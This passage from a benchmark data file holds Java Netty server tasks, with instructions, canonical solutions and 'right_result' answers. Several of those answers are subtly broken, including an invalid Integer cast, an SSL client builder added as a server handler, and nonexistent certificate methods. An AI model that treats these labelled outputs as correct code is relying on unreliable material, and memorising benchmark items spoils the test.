JSON_FACTORY.configure(JsonGenerator.Feature.QUOTE_FIELD_NAMES, true);\n        JSON_FACTORY.configure(JsonParser.Feature.ALLOW_COMMENTS, true);\n    }\n\n    public HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler, @Nullable Map<String, String> headers) {\n        this.port = port;\n        this.fail = fail;\n        this.requestHandler = requestHandler;\n        this.headers = headers;\n    }\n\n    public HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler) {\n        this(port, fail, requestHandler, null);\n    }\n\n    public void run() throws InterruptedException {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        group = new NioEventLoopGroup();\n        bootstrap.group(group);\n        bootstrap.channel(NioServerSocketChannel.class);\n        bootstrap.childHandler(new ChannelInitializer<Channel>() {\n            @Override\n            protected void initChannel(Channel ch) {\n                ChannelPipeline pipeline = ch.pipeline();\n                pipeline.addLast(\"decoder\", new HttpRequestDecoder());\n                pipeline.addLast(\"encoder\", new HttpResponseEncoder());\n                pipeline.addLast(\"deflater\", new HttpContentCompressor());\n                pipeline.addLast(\"handler\", new HttpTestServerHandler());\n            }\n        });\n        channel = bootstrap.bind(new InetSocketAddress(port)).sync().channel();\n    }\n\n    public int boundPort() {\n        InetSocketAddress localAddress = (InetSocketAddress) channel.localAddress();\n        return localAddress.getPort();\n    }\n\n    public void shutDown() {\n        channel.close().awaitUninterruptibly();\n        if (group != null) {\n            group.shutdownGracefully().awaitUninterruptibly();\n            group.terminationFuture().awaitUninterruptibly();\n            group = null;\n        }\n    }\n\n    @ChannelHandler.Sharable\n    public class HttpTestServerHandler extends SimpleChannelInboundHandler<Object> {\n        private final Logger logger = LogManager.getLogger(HttpTestServerHandler.class.getName());\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n            if (!(msg instanceof HttpRequest)) {\n                ctx.fireChannelRead(msg);\n                return;\n            }\n            try {\n                handleHttpRequest(ctx, (HttpRequest) msg);\n            } finally {\n                ReferenceCountUtil.release(msg);\n            }\n        }\n\n        private void handleHttpRequest(ChannelHandlerContext ctx, HttpRequest msg) throws UnsupportedEncodingException {\n            String uri = msg.uri();\n            logger.debug(\"Got Request for \" + uri);\n            HttpResponseStatus status = fail ? HttpResponseStatus.BAD_REQUEST : HttpResponseStatus.OK;\n            ByteArrayOutputStream out = new ByteArrayOutputStream();\n            try {\n                JsonGenerator generator = JSON_FACTORY.createGenerator(out, JsonEncoding.UTF8);\n                requestHandler.accept(msg, generator);\n            } catch (Exception ex) {\n                status = HttpResponseStatus.INTERNAL_SERVER_ERROR;\n            }\n            ByteBuf byteBuf = Unpooled.wrappedBuffer(out.toByteArray());\n            responses.add(out.toString(StandardCharsets.UTF_8));\n\n            DefaultFullHttpResponse response;\n            if (headers != null && headers.isEmpty() == false) {\n                HttpHeaders httpHeaders = new DefaultHttpHeaders();\n                for (var entries : headers.entrySet()) {\n                    httpHeaders.add(entries.getKey(), entries.getValue());\n                }\n                response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, byteBuf, httpHeaders, EmptyHttpHeaders.INSTANCE);\n            } else {\n                response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, byteBuf);\n            }\n\n            ChannelFuture future = ctx.channel().writeAndFlush(response);\n            future.addListener(ChannelFutureListener.CLOSE);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n            logger.warn(\"Unexpected exception from downstream.\", cause);\n            ctx.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.util.CharsetUtil;\n\nimport com.fasterxml.jackson.core.JsonFactory;\nimport com.fasterxml.jackson.core.JsonGenerator;\n\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class HttpTestServer {\n    private final int port;\n    private final boolean fail;\n    private final BiConsumer<HttpRequest, JsonGenerator> requestHandler;\n    private final Map<String, String> headers;\n    private Channel channel;\n    private NioEventLoopGroup group;\n    private final List<String> responses = new ArrayList<>();\n    private static final JsonFactory JSON_FACTORY = new JsonFactory();\n\n    public HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler, Map<String, String> headers) {\n        this.port = port;\n        this.fail = fail;\n        this.requestHandler = requestHandler;\n        this.headers = headers;\n    }\n\n    public HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler) {\n        this(port, fail, requestHandler, null);\n    }\n\n    public void run() throws Exception {\n        group = new NioEventLoopGroup();\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(group)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new HttpRequestDecoder());\n                        ch.pipeline().addLast(new HttpResponseEncoder());\n                        ch.pipeline().addLast(new HttpTestServerHandler());\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        channel = bootstrap.bind(port).sync().channel();\n    }\n\n    public int boundPort() {\n        return ((InetSocketAddress) channel.localAddress()).getPort();\n    }\n\n    public void shutDown() {\n        if (channel != null) {\n            channel.close();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    private class HttpTestServerHandler extends SimpleChannelInboundHandler<FullHttpRequest> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) throws Exception {\n            ByteBuf content = Unpooled.copiedBuffer(\"{}\", CharsetUtil.UTF_8);\n            FullHttpResponse response;\n\n            try {\n                ByteBuf buffer = Unpooled.copiedBuffer(request.content().nioBuffers().get(0));\n                String jsonBody = buffer.toString(CharsetUtil.UTF_8);\n                byte[] bodyBytes = jsonBody.getBytes(CharsetUtil.UTF_8);\n\n                DefaultFullHttpResponse httpResponse = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, fail ? HttpResponseStatus.BAD_REQUEST : HttpResponseStatus.OK,\n                        Unpooled.wrappedBuffer(bodyBytes));\n\n                if (headers != null) {\n                    for (Map.Entry<String, String> header : headers.entrySet()) {\n                        httpResponse.headers().set(header.getKey(), header.getValue());\n                    }\n                }\n\n                ByteBuf jsonOutput = Unpooled.buffer();\n                try (JsonGenerator generator = JSON_FACTORY.createGenerator(jsonOutput, CharsetUtil.UTF_8)) {\n                    requestHandler.accept(request, generator);\n                }\n                httpResponse.content().writeBytes(jsonOutput);\n                httpResponse.headers().set(HttpHeaderNames.CONTENT_TYPE, \"application/json\");\n                httpResponse.headers().set(HttpHeaderNames.CONTENT_LENGTH, httpResponse.content().readableBytes());\n\n                response = httpResponse;\n                responses.add(jsonOutput.toString(CharsetUtil.UTF_8));\n            } catch (Exception e) {\n                response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.INTERNAL_SERVER_ERROR,\n                        Unpooled.copiedBuffer(e.getMessage(), CharsetUtil.UTF_8));\n                response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/plain\");\n            }\n\n            ctx.writeAndFlush(response);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 217,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process serialized data.\n\nClass Description: SerializationServer is a Netty-based TCP server that listens on a specified port for incoming connections, processes serialized data through a custom pipeline, and manages server resources efficiently.\n\nAttributes:\nPORT: static final int - The port number on which the server will listen for incoming connections (default: 8082)\n\nMethods:\nstart(): void - Starts the Netty TCP server with the following behavior:\n1. Creates boss and worker event loop groups for connection handling\n2. Configures server bootstrap with NIO transport channel\n3. Sets server options (backlog and keepalive)\n4. Adds logging handler and custom pipeline initializer\n5. Binds to the specified port and waits for server shutdown\n6. Cleans up resources on shutdown\n\nInput: None (The port is defined as a class constant)\n\nOutput: None (The method runs indefinitely until server shutdown)\n\nNote: The class requires proper exception handling for server operations and resource cleanup in finally block. The actual data processing is handled by a separate SerializationServerInitializer class which should be provided separately.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic final class SerializationServer {\n\n    static final int PORT = 8082;\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new SerializationServerInitializer());\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic class SerializationServer {\n    private static final int PORT = 8082;\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n    public void start() {\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new SerializationServerInitializer());\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 218,
    "Instruction": "Task Description: Create a Java class that implements a secure TCP chat server using Netty framework, supporting SSL/TLS encryption for secure communication between clients and the server.\n\nClass Description: SecureChatServer is a Netty-based TCP server that handles secure chat communications. It initializes SSL context, configures server bootstrap with event loop groups, and manages server lifecycle including graceful shutdown.\n\nAttributes:\nPORT: int - The port number on which the server listens for incoming connections (default: 8992)\nsslCtx: SslContext - The SSL context used for secure communication\nbossGroup: EventLoopGroup - The parent event loop group that accepts incoming connections\nworkerGroup: EventLoopGroup - The child event loop group that handles the traffic of accepted connections\n\nMethods:\nmain: main(String[] args) -> void - Entry point that initializes SSL context, configures server, binds to port, and manages server lifecycle\n    - args: String[] - Command line arguments (unused in this implementation)\n    - No explicit return value (void)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class SecureChatServer {\n\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    public static void main(String[] args) throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        SslContext sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey())\n            .build();\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new SecureChatServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class SecureChatServer {\n    static final int PORT = 8992;\n\n    public static void main(String[] args) throws Exception {\n        // Generate a self-signed certificate for testing purposes.\n        final SelfSignedCertificate ssc = new SelfSignedCertificate();\n        SslContext sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) {\n                     ch.pipeline().addLast(sslCtx.newHandler(ch.alloc()));\n                     ch.pipeline().addLast(new StringDecoder());\n                     ch.pipeline().addLast(new StringEncoder());\n                     ch.pipeline().addLast(new ChatServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            // Bind and start to accept incoming connections.\n            ChannelFuture f = b.bind(PORT).sync();\n\n            System.out.println(\"Secure chat server started on port \" + PORT);\n\n            // Wait until the server socket is closed.\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 219,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests, with optional SSL support for secure connections.\n\nClass Description: The HttpHelloWorldServer class is a Netty-based TCP server that listens for HTTP requests on a specified port. It supports both plain HTTP and HTTPS (when SSL is enabled) connections. The server uses a boss-worker thread model for handling connections and includes logging capabilities.\n\nAttributes:\n- SSL: static final boolean - Flag indicating whether SSL should be enabled\n- PORT: static final int - The port number on which the server will listen\n\nMethods:\n- start(): void - Starts the Netty TCP server. Throws Exception if any error occurs during startup.\n  - Input: None\n  - Output: None (but starts the server process)\n  - Description: Initializes SSL context if enabled, sets up event loop groups, configures server bootstrap with channel options and handlers, binds to the specified port, and keeps the server running until shutdown. Properly cleans up resources on shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class HttpHelloWorldServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8443\" : \"8080\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.option(ChannelOption.SO_BACKLOG, 1024);\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new HttpHelloWorldServerInitializer(sslCtx));\n\n            Channel ch = b.bind(PORT).sync().channel();\n\n            System.err.println(\"Open your web browser and navigate to \" +\n                    (SSL? \"https\" : \"http\") + \"://127.0.0.1:\" + PORT + '/');\n\n            ch.closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class HttpHelloWorldServer {\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8080\"));\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<>() {\n                 @Override\n                 protected void initChannel(Channel ch) {\n                     if (SSL) {\n                         ch.pipeline().addLast(SslContext.newServerContext(\n                                 new SelfSignedCertificate().cert(), new SelfSignedCertificate().key()));\n                     }\n                     ch.pipeline().addLast(new HttpRequestDecoder());\n                     ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                     ch.pipeline().addLast(new HttpResponseEncoder());\n                     ch.pipeline().addLast(new HttpHelloWorldServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        new HttpHelloWorldServer().start();\n    }\n}\n```"
  },
  {
    "Task_id": 220,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle client connections and process requests, with optional SSL support for secure communication.\n\nClass Description: The FactorialServer class is a Netty-based TCP server that listens for incoming client connections on a specified port. It supports both plain and SSL-encrypted connections, and uses a separate initializer class to configure the channel pipeline for request processing.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be enabled\n- PORT: int - The port number on which the server will listen for connections\n\nMethods:\n- start(): void - Starts the Netty TCP server with the configured settings. Handles server initialization, binding to the specified port, and proper resource cleanup on shutdown. Throws Exception if any error occurs during server startup.\n\nInput: None (Configuration is done through system properties: \"ssl\" for enabling SSL and \"port\" for specifying the server port)\n\nOutput: None (The server runs continuously until shutdown)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class FactorialServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8322\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContext.newServerContext(ssc.certificate(), ssc.privateKey());\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new FactorialServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class FactorialServer {\n    private final boolean SSL;\n    private final int PORT;\n\n    public FactorialServer(boolean ssl, int port) {\n        this.SSL = ssl;\n        this.PORT = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     if (SSL) {\n                         ch.pipeline().addLast(SslContextBuilder.forClient().build());\n                     }\n                     ch.pipeline().addLast(new StringDecoder(), new StringEncoder(), new FactorialRequestHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            if (SSL) {\n                SelfSignedCertificate ssc = new SelfSignedCertificate();\n                SslContext sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n                b.childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(sslCtx.newHandler(ch.alloc()));\n                        ch.pipeline().addLast(new StringDecoder(), new StringEncoder(), new FactorialRequestHandler());\n                    }\n                });\n            }\n\n            ChannelFuture f = b.bind(PORT).sync();\n            System.out.println(\"Server started on port \" + PORT);\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    static class FactorialRequestHandler extends io.netty.channel.ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(io.netty.channel.ChannelHandlerContext ctx, Object msg) {\n            String request = (String) msg;\n            int n = Integer.parseInt(request.trim());\n            long result = factorial(n);\n            ctx.writeAndFlush(String.valueOf(result));\n        }\n\n        private long factorial(int n) {\n            long res = 1;\n            for (int i = 2; i <= n; i++) {\n                res *= i;\n            }\n            return res;\n        }\n\n        @Override\n        public void exceptionCaught(io.netty.channel.ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        boolean ssl = Boolean.parseBoolean(System.getProperty(\"ssl\", \"false\"));\n        int port = Integer.parseInt(System.getProperty(\"port\", \"8080\"));\n\n        new FactorialServer(ssl, port).start();\n    }\n}\n```"
  },
  {
    "Task_id": 221,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of starting and stopping the server, and handling incoming client connections through a configurable pipeline.\n\nClass Description: MocoServer is a Netty-based TCP server implementation that provides simple start/stop functionality and allows for custom channel pipeline configuration. It manages server resources including event loop groups and channel futures.\n\nAttributes:\n- group: [EventLoopGroup] - Netty event loop group for handling I/O operations\n- future: [ChannelFuture] - Future representing the server's channel binding operation\n\nMethods:\n- MocoServer() -> [void] - Constructor that initializes the event loop group\n- start([int port, ChannelInitializer<? extends Channel> pipelineFactory]) -> [int] - Starts the server on specified port with given pipeline configuration, returns actual bound port\n- stop() -> [void] - Stops the server gracefully, releasing all resources",
    "Canonical_solution": "import com.github.dreamhead.moco.MocoException;\nimport com.github.dreamhead.moco.util.MocoExecutors;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.concurrent.Future;\n\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.util.concurrent.TimeUnit;\n\npublic final class MocoServer {\n    private EventLoopGroup group;\n    private ChannelFuture future;\n\n    public MocoServer() {\n        group = new NioEventLoopGroup(0, MocoExecutors.executor());\n    }\n\n    public int start(final int port, final ChannelInitializer<? extends Channel> pipelineFactory) {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(group)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(pipelineFactory);\n\n        try {\n            future = bootstrap.bind(port).sync();\n            SocketAddress socketAddress = future.channel().localAddress();\n            return ((InetSocketAddress) socketAddress).getPort();\n        } catch (InterruptedException e) {\n            throw new MocoException(e);\n        }\n    }\n\n    public void stop() {\n        if (future != null) {\n            future.channel().close().syncUninterruptibly();\n            future = null;\n        }\n\n        if (group != null) {\n            Future<?> groupFuture = group.shutdownGracefully(0, 0, TimeUnit.SECONDS);\n            try {\n                groupFuture.get();\n            } catch (Exception e) {\n                throw new IllegalStateException(e);\n            }\n            group = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class MocoServer {\n    private final EventLoopGroup group = new NioEventLoopGroup();\n    private ChannelFuture future;\n\n    public int start(int port, ChannelInitializer<? extends SocketChannel> pipelineFactory) throws Exception {\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(group)\n                     .channel(NioServerSocketChannel.class)\n                     .childHandler(pipelineFactory)\n                     .option(ChannelOption.SO_BACKLOG, 128)\n                     .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            future = bootstrap.bind(port).sync();\n            return ((Integer) future.channel().localAddress()).intValue();\n        } catch (Exception e) {\n            stop();\n            throw e;\n        }\n    }\n\n    public void stop() {\n        if (future != null) {\n            future.channel().close();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 222,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that can handle custom protocol messages with proper encoding/decoding and processing.\n\nClass Description: ProtocolServer is a Netty-based TCP server implementation that listens on a specified port, handles incoming connections, and processes custom protocol messages using dedicated encoder/decoder and handler components.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\nMAX_FRAME_LENGTH: static final int - Maximum allowed frame length for incoming messages (1MB)\nLENGTH_FIELD_LENGTH: static final int - Length of the length field in the protocol (4 bytes)\nLENGTH_FIELD_OFFSET: static final int - Offset of the length field in the protocol (6 bytes)\nLENGTH_ADJUSTMENT: static final int - Adjustment value for the length field (0)\nINITIAL_BYTES_TO_STRIP: static final int - Number of bytes to strip from the beginning of the message (0)\n\nMethods:\nProtocolServer(int port) -> None - Constructor that initializes the server with the specified port number\nrun() -> void - Starts the Netty server, configures the pipeline with protocol handlers, and begins listening for connections (throws Exception)",
